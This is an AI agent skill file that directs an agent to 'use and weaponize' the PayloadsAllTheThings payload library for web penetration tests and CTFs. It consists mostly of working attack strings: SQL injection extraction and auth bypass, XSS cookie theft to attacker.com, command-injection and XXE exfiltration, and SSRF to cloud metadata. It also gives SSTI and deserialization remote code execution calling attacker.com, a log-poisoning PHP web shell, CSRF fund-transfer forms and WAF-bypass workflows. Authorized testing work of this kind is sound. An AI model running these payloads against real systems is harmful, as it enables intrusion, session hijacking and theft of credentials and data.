---
name: payloads-all-the-things
description: >
  Use and weaponize the PayloadsAllTheThings payload library for web application
  penetration testing and CTF engagements. Use when the user needs injection payloads,
  bypass techniques, or exploitation strings for SQL injection, XSS, command injection,
  SSRF, XXE, SSTI, CSRF, LFI/RFI, directory traversal, authentication bypass, or
  deserialization attacks. Covers payload selection, real-world delivery with Burp Suite
  and curl, WAF bypass, chaining vulnerabilities, and reporting. Source:
  https://github.com/swisskyrepo/PayloadsAllTheThings
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/swisskyrepo/PayloadsAllTheThings
  stars: '76602'
---

# payloads-all-the-things Agent Skill

## When to Use This Skill

Use this skill when:
- The user needs injection payloads for a web application pentest or CTF
- Testing for SQLi, XSS, SSTI, SSRF, XXE, command injection, LFI/RFI, or deserialization
- Looking for WAF bypass strings or encoding tricks
- Delivering payloads via Burp Suite, curl, or automated tooling
- The user references PayloadsAllTheThings (PATT) or asks for a payload cheat sheet

## What PayloadsAllTheThings Is

PayloadsAllTheThings is a community-maintained repository of attack payloads and bypass
techniques organized by vulnerability class. It is a reference library — not a tool —
used to hand-pick or adapt payloads for manual and semi-automated testing. Pair it with
Burp Suite, curl, ffuf, or sqlmap to deliver payloads systematically.

## Installation / Local Mirror

```bash
# Clone for offline access (recommended for engagements without internet)
git clone --depth=1 https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings

# Directory structure
ls
# Command Injection/
# Directory Traversal/
# File Inclusion/
# NoSQL Injection/
# Server Side Request Forgery/
# Server Side Template Injection/
# SQL Injection/
# XSS Injection/
# XXE Injection/
# ... (40+ categories)

# Quick grep for a payload type
grep -r "sleep(5)" "SQL Injection/"
grep -r "{{7*7}}" "Server Side Template Injection/"
```

## SQL Injection Payloads

### Detection / Error-Based

```sql
-- Classic detection
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Error-based (MySQL)
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--

-- Error-based (MSSQL)
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--          -- MSSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -- PostgreSQL
```

### Union-Based Extraction

```sql
-- Find column count
' ORDER BY 1--
' ORDER BY 2--    (increment until error)

-- Find injectable column (string context)
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--

-- Extract data (MySQL)
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--

-- File read via UNION (MySQL, requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
```

### Delivery with curl and Burp

```bash
# curl with URL-encoded payload
curl -s "http://target/item?id=1%27%20UNION%20SELECT%20user(),version(),NULL--"

# curl with POST body
curl -s -X POST http://target/login \
  -d "user=admin'--&pass=x"

# Burp: send to Intruder, mark §injection§ position, load PATT wordlist
# Wordlist path after cloning:
cat PayloadsAllTheThings/SQL\ Injection/Intruder/Auth_Bypass.txt
cat PayloadsAllTheThings/SQL\ Injection/Intruder/FUZZ_INT.txt
```

## XSS Payloads

### Reflected / Stored

```html
<!-- Basic alert probes -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Attribute injection -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- Filter bypass -->
<ScRiPt>alert(1)</ScRiPt>
<script/src=//evil.com/x.js></script>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<<script>alert(1)//<</script>
<svg><script>alert&#40;1&#41;</script></svg>

<!-- JavaScript URI -->
javascript:alert(1)
jaVaScRiPt:alert(1)
data:text/html,<script>alert(1)</script>
```

### DOM XSS Sinks

```javascript
// Common sink patterns to test in source code review
document.write(location.hash)
document.innerHTML = location.search
eval(location.hash.slice(1))

// Probe: append to URL hash
http://target/page#<img src=x onerror=alert(1)>
http://target/page?q=<svg onload=alert(1)>
```

### XSS to Cookie Exfil

```html
<script>
fetch('https://attacker.com/log?c='+btoa(document.cookie))
</script>

<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```

## Command Injection

### Detection Strings

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
; ping -c 3 attacker.com
```

### Blind OOB (Out-of-Band) Confirmation

```bash
# DNS exfil via curl/wget/nslookup
; curl http://$(whoami).attacker.com/
; nslookup `whoami`.attacker.com
; wget http://attacker.com/$(id|base64)
# Listen: python3 -m http.server 80 or use Burp Collaborator
```

### Filter Bypass

```bash
# Space bypass
{IFS}id       # $IFS in bash
cat${IFS}/etc/passwd
cat</etc/passwd

# Slash bypass
cat /etc/pa$()sswd
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Quote tricks
c'a't /etc/passwd
c"a"t /etc/passwd
```

## Server-Side Request Forgery (SSRF)

### Basic Probes

```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://169.254.169.254/latest/meta-data/   # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/  # GCP (needs header)
http://169.254.169.254/metadata/v1/        # DigitalOcean
```

### Protocol Wrappers

```
file:///etc/passwd
dict://127.0.0.1:6379/info      # Redis
gopher://127.0.0.1:9200/_cat/indices  # Elasticsearch
sftp://attacker.com:11111/
ldap://127.0.0.1:389/%0astats%0aquit
```

### Bypass Techniques

```
# IP encoding
http://2130706433/          # 127.0.0.1 decimal
http://0x7f000001/          # 127.0.0.1 hex
http://0177.0.0.1/          # 127.0.0.1 octal

# DNS rebinding / redirector
http://attacker.com/redirect?to=http://169.254.169.254/

# IPv6
http://[::ffff:7f00:1]/
```

## XML External Entity (XXE)

### Classic File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
```

### Blind OOB via DTD

```xml
<!-- Attacker-hosted evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%oob; %send;

<!-- Payload in request -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote;]>
<root/>
```

### XXE in JSON Endpoints

```bash
# Change Content-Type to trigger XML parser
curl -X POST http://target/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

## Server-Side Template Injection (SSTI)

### Detection Polyglot

```
{{7*7}}          → 49 (Jinja2/Twig)
${7*7}           → 49 (FreeMarker/Thymeleaf)
<%= 7*7 %>       → 49 (ERB/JSP)
#{7*7}           → 49 (Ruby/Slim)
{{7*'7'}}        → 7777777 (Jinja2)
```

### RCE by Engine

```python
# Jinja2 (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()[0].strip()}} <!-- markdown-link-check: ignore -->
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').system('id')")}}{% endif %}{% endfor %}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= system("id") %>
```

## Directory Traversal

```bash
# Basic
../../../etc/passwd
..\..\..\windows\win.ini

# Encoding bypasses
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd    # double URL encode
%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//etc/passwd          # strip ../ bypass
..././..././etc/passwd          # ../ strip bypass

# Null byte (old PHP)
../../../../etc/passwd%00.jpg

# Absolute path
/etc/passwd
C:\Windows\System32\drivers\etc\hosts
```

## Authentication Bypass

### SQL Auth Bypass

```sql
admin'--
admin'#
' OR 1=1--
' OR '1'='1'--
admin') OR ('1'='1
') OR 1=1--
1' OR '1' = '1
```

### JWT Manipulation

```bash
# None algorithm attack
# Decode header, change alg to "none", remove signature
echo -n '{"alg":"none","typ":"JWT"}' | base64
# Forge: header.payload. (empty signature)

# HS256 with RS256 public key confusion
# If server uses RS256 but accepts HS256, sign with the public key as HMAC secret
```

### Default Credentials (top combos)

```
admin:admin       admin:password    admin:1234
root:root         root:toor         admin:
test:test         guest:guest       operator:operator
```

## File Inclusion (LFI/RFI)

```bash
# LFI wrappers (PHP)
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://input    # + POST body as PHP code
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning via LFI
# 1. Poison the log: curl -A "<?php system(\$_GET['c']); ?>" http://target/
# 2. Include: ?page=/var/log/apache2/access.log&c=id

# RFI
?page=http://attacker.com/shell.txt
?page=\\attacker.com\share\shell.txt   # Windows UNC
```

## Deserialization Attacks

### Java (ysoserial)

```bash
# Generate payload for Commons Collections gadget chain
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' > payload.ser

# Deliver via HTTP POST, cookie, or parameter
curl -X POST http://target/api \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

### PHP Object Injection

```php
// Vulnerable code pattern: unserialize($_GET['data'])
// Craft malicious object manually or use PHPGGC:
./phpggc Monolog/RCE1 system id
./phpggc -u --fast-destruct Laravel/RCE11 system "curl http://attacker.com"
```

### Python Pickle RCE

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(id)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send as cookie or parameter value
```

## CSRF Payloads

```html
<!-- GET-based -->
<img src="http://target/account/delete?confirm=yes">

<!-- POST-based (auto-submit form) -->
<form action="http://target/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>

<!-- JSON CSRF (if no CORS protection) -->
<script>
fetch('http://target/api/change-email',{
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:'{"email":"attacker@evil.com"}'
})
</script>
```

## Burp Suite Integration

```
1. Send request to Repeater → manually test single payloads
2. Send to Intruder → load PATT wordlist files for fuzzing
   Wordlists live in: PayloadsAllTheThings/<Category>/Intruder/
3. Extensions:
   - Active Scan++ uses PATT-style payloads automatically
   - Copy As Python-Requests for curl reproduction
4. Match & Replace rules: auto-append SQLi probe to every GET param
```

## Common Workflows

### Enumeration → Exploitation Chain

```bash
# 1. Find parameter reflection
ffuf -u "http://target/search?q=FUZZ" -w PayloadsAllTheThings/XSS\ Injection/Intruder/xss-reflected.txt -mr "<script"

# 2. Confirm SQLi with time-based
curl -s "http://target/item?id=1' AND SLEEP(5)--" --max-time 10

# 3. Hand off to sqlmap
sqlmap -u "http://target/item?id=1" --level=3 --risk=2 --dbs
```

### WAF Bypass Workflow

```bash
# Test baseline: blocked or not?
curl -s -o /dev/null -w "%{http_code}" "http://target/?x=<script>alert(1)</script>"

# Try encoding variants from PATT
# URL encode, double encode, Unicode, HTML entity
curl -s "http://target/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl -s "http://target/?x=\u003cscript\u003ealert(1)\u003c/script\u003e"

# Tamper scripts for sqlmap
sqlmap -u "http://target/?id=1" --tamper=space2comment,charencode,between
```

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---|---|---|
| Payload blocked by WAF | Signature match | Try encoding, case variation, comment insertion |
| SQLi payload causes 500 | Syntax mismatch (DB type) | Identify DB type first; use DB-specific syntax |
| SSRF returns empty | Outbound filtered | Try DNS-only OOB; check Collaborator/interactsh |
| SSTI outputs literal `{{7*7}}` | Template engine not detected or escaped | Try alternate delimiters `${`, `#{}`, `<%= %>` |
| XSS reflected but not executing | CSP blocking inline scripts | Check CSP header; look for JSONP/script-src bypass |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
